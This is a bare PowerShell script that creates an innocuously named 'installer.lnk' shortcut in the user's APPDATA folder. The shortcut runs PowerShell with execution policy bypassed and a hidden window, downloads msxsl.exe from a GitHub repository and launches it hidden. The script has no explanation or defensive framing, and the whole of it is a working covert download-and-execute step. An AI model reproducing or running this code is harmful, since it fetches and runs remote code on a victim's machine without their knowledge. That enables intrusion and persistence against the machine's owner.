$WshShell = New-Object -ComObject WScript.Shell                                               
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\installer.lnk")                    
$Shortcut.TargetPath = "powershell.exe"                                                                              
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { Invoke-WebRequest -Uri 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/msxsl.exe' -OutFile '%APPDATA%\msxsl.exe'; Start-Process -FilePath '%APPDATA%\msxsl.exe' -WindowStyle Hidden }`""                                                                    
$Shortcut.WorkingDirectory = "$env:APPDATA"                                                                         
$Shortcut.Save()       
